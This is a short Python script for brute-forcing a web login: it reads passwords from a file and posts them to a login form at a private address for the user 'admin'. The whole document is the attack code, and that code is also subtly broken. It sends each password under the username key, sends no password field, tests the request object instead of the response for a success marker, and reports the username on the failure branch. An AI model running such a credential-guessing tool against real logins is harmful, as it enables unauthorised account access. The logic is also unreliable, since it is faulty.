import requests
def bruteforce(username,url):
   for password in passwords:
      password = password.strip()
      print(' tring to bruteforce password '+password)
      data_dictionary = {'username':password ,'submit':'تسجيل الدخول'}
      resp = requests.post(url, data_dictionary)
      x = requests.get(url)
      print(resp.json)
      if "%27%46%2a%20%27%44%27%46%20%45%31%2a%28%37%20%28%27%44%41%39%44%0c%20%2d%27%48%44%20%44%27%2d%42%27%4b%20" in str(resp.request):
          exit()
      else:
          print("username is : "+ username)
          pass
          
url='http://10.0.0.1/login'
username= 'admin'
with open('pas.txt','r') as passwords:
    bruteforce(username, url)